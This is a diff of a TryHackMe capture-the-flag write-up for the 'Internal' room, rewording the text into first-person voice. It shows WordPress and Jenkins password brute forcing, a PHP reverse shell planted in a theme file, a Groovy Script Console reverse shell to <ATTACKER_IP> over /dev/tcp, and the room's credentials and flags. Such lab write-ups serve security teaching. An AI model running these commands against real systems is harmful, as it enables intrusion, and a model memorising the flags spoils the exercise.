@@ -1,7 +1,6 @@
+## About Internal
 
-**Objectives**:
-1. User.txt Flag
-2. Root.txt Flag
+**Name:** Internal
 
 **Room:** https://tryhackme.com/room/internal
 
@@ -11,7 +10,8 @@
 
 **Target IP:** `10.48.157.111`
 
-## Walkthrough
+---
+## Enumeration
 
 An initial Nmap scan was performed against the target to identify open ports, running services, and the operating system:
 
@@ -19,18 +19,17 @@ An initial Nmap scan was performed against the target to identify open ports, ru
 nmap -sC -sV -Pn -O 10.48.157.111 -oN Internal
 ```
 
-
-The scan revealed two open ports: **port 22 (SSH)** and **port 80 (HTTP)**. Here, port 80 pointed to a web application worth investigating first.
+The scan revealed two open ports: **port 22 (SSH)** and **port 80 (HTTP)**. Since SSH needs valid credentials to be useful and we didn't have any yet, port 80 was the logical place to start digging.
 
 ![](Assets/Nmap.png)
 
 
-Browsing to `http://10.48.157.111` returned the default Apache2 landing page. Reviewing the page source for hardcoded credentials or comments did not yield any useful information, so directory brute-forcing was the next logical step.
+Browsing to `http://10.48.157.111` just gave us the default Apache2 landing page - nothing custom, nothing useful in the page source either. So we moved on to directory brute-forcing to see if anything was hidden behind the default page.
 
 ![](Assets/Default_Apache.png)
 
+Using `ffuf` with a medium-sized wordlist, we enumerated hidden directories:
 
-Using `ffuf` with a medium-sized wordlist, hidden directories were enumerated:
 ```
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.48.157.111/FUZZ 
 ```
@@ -38,69 +37,68 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://1
 ![](Assets/Directory_Burteforcing.png)
 
 
-This uncovered a `/blog/` directory, which hosted a completely different interface from the default Apache page.
+This turned up a `/blog/` directory, which hosted a completely different interface from the default Apache page - a strong sign we'd found the real application.
 
 ![](Assets/Interface.png)
 
 
-Navigating to `http://10.48.157.111/blog/` revealed a WordPress-style site. Further inspection led to the discovery of the login page at `http://internal.thm/blog/wp-login.php`.
+Navigating to `http://10.48.157.111/blog/` revealed a WordPress-style site. A bit more digging led us to the login page at `http://internal.thm/blog/wp-login.php`.
 
 ![](Assets/login_page.png)
 
+## Foothold
 
-Testing some default and commonly used credentials against the login page confirmed that the username `admin` was valid.
+We tried a few default and commonly used credentials against the login page and confirmed that the username **admin** was valid - the login form's error message gave this away even without knowing the password yet.
 
 ![](Assets/admin.png)
 
+To recover the password, we used WPScan to brute-force the admin account via WordPress's **XML-RPC interface**. XML-RPC is worth targeting specifically because it allows multiple login attempts to be bundled into a single request, which makes brute-forcing through it noticeably faster than hitting the normal login form directly:
 
-To obtain the password, WPScan was used to brute-force the admin account via the XML-RPC interface:
 ```
 sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog/
 ```
 
 
-After waiting some minutes, this attack successfully returned a valid password for the `admin` account.
+After waiting a few minutes, this attack successfully returned a valid password for the `admin` account.
 
 ![700](Assets/admin_password.png)
 
 
-Logging in with the recovered credentials granted us this interface. Let's just click on "Remind me later" and we're in!
+We logged in with the recovered credentials, which took us to the WordPress dashboard. A "Remind me later" prompt appeared on first login, so we just dismissed it and moved on.
 
 ![](Assets/Remind_me_later.png)
 
-
-So, we are inside the wordpress dashboard. From here, click on "Appearance" on the side panel and select "Theme Editor". This page will let us edit the PHP source code directly.
+With dashboard access secured, our next goal was to find a way to execute code on the server. WordPress admins have access to **Appearance → Theme Editor**, which lets us directly edit the PHP files of any installed theme. 
 
 ![](Assets/dashboard2.png)
-
 
 An inactive theme can be selected to avoid corrupting the primary theme. An alternate theme such as `Twenty Seventeen` can be chosen instead.
 
 ![](Assets/theme.png)
 
-
-A PHP reverse shell payload, sourced from [pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), was inserted into the theme's `404.php` file.
+We inserted a PHP reverse shell payload, sourced from [pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), into the theme's `404.php` file.
 
 ![](Assets/payload.png)
 
 
-After saving the file, a netcat listener was started on the attack machine, and the payload was triggered by browsing to:
+After saving the file, we started a netcat listener on our attack machine and triggered the payload by browsing to:
+
 ```
 http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
 ```
 
 
-This returned a reverse shell connection, confirming the foothold on the target.
+This returned a reverse shell connection, confirming our foothold on the target.
 
 ![](Assets/reverse-shell.png)
 
 
-Navigating to the home directory revealed a user folder, but the current shell's privileges were insufficient to access its contents directly.
+Navigating to the home directory, we found a user folder, but our current shell (running as the web server user) didn't have the privileges to access its contents directly.
 
 ![](Assets/denied.png)
 
+I spent roughly thirty minutes manually poking around before running a broader search for text files across the filesystem, since config files, notes, and leftover credentials are often stored in plain `.txt` files:
 
-After roughly thirty minutes of manual enumeration, a search for text files across the filesystem surfaced an interesting result:
 ```
 find / -type f -name "*.txt" 2>/dev/null
 ```
@@ -108,44 +106,46 @@ find / -type f -name "*.txt" 2>/dev/null
 ![](Assets/txt2.png)
 
 
-Reading the discovered file revealed the credentials `aubreanna: bubb13guM!@#123`
+Reading through the results, one file revealed the credentials `aubreanna:bubb13guM!@#123`.
 
 ![](Assets/credentials2.png)
 
 
-Switching to the `aubreanna` account with these credentials granted access to the user flag `THM{int3rna1_fl4g_1}`
+Switching to the `aubreanna` account with these credentials gave us access to the **user flag**: `THM{int3rna1_fl4g_1}`
 
 ![700](Assets/user.txt.png)
 
+## Privilege Escalation
 
-Continued enumeration under this user uncovered a file named `jenkins.txt`, which referenced a hidden service running internally on **port 8080**.
+Continuing our enumeration under this user, we found a file named `jenkins.txt`, which pointed us to a hidden service running internally on **port 8080**, meaning it wasn't reachable directly from our attack machine over the network.
 
 ![](Assets/hidden.png)
 
-
 Since the Jenkins service was not directly reachable, an SSH local port forward was established to tunnel traffic from the attack machine to the target's internal service:
+
 ```
 ssh -L 1234:localhost:8080 aubreanna@10.48.157.111
 ```
 
 
-With the tunnel in place, we can access the Jenkins web interface locally at `http://127.0.0.1:1234`.
+With the tunnel in place, we could access the Jenkins web interface locally at `http://127.0.0.1:1234`.
 
 ![](Assets/jenkins.png)
 
 
-The Jenkins login form was then brute-forced using Hydra to recover valid administrator credentials:
+We then brute-forced the Jenkins login form using Hydra to recover valid administrator credentials:
+
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 1234 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password'
 ```
 
 
-This attack returned the valid credentials `admin:spongebob`, which were used to log in successfully.
+This returned valid credentials, `admin:spongebob`, which we used to log in successfully.
 
 ![](Assets/creds.png)
 
+With administrative access confirmed, we had access to Jenkins's built-in **Script Console** at `http://127.0.0.1:1234/script`. Using this script console, we can run arbitrary commands, functioning similarly to a web shell. Here, we used the following script to get a reverse shell:
 
-With administrative access to Jenkins confirmed, the built-in **Script Console** (`http://127.0.0.1:1234/script`) was accessible. Using this script console, we can run arbitrary commands, functioning similarly to a web shell. Here, we can gain a reverse shell using the command below:
 ```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -155,12 +155,11 @@ p.waitFor()
 ![](Assets/console.png)
 
 
-Click on run and we got a reverse shell connection on our netcat listener. Navigating to the `/opt` directory revealed a `note.txt` file containing the root credentials `root:tr0ub13guM!@#123`.
+Running this script gave us a reverse shell on our netcat listener. From here, we checked `/opt` and found a `note.txt` file containing the root credentials `root:tr0ub13guM!@#123`.
 
 ![](Assets/root.png)
 
-
-Logging in as root over SSH using these credentials confirmed full compromise of the machine and provided access to the root flag `THM{d0ck3r_d3str0y3r}`.
+We logged in as root over SSH using these credentials, confirming full compromise of the machine and giving us access to the **root flag**: `THM{d0ck3r_d3str0y3r}`.
 
 ![](Assets/root.txt.png)
 
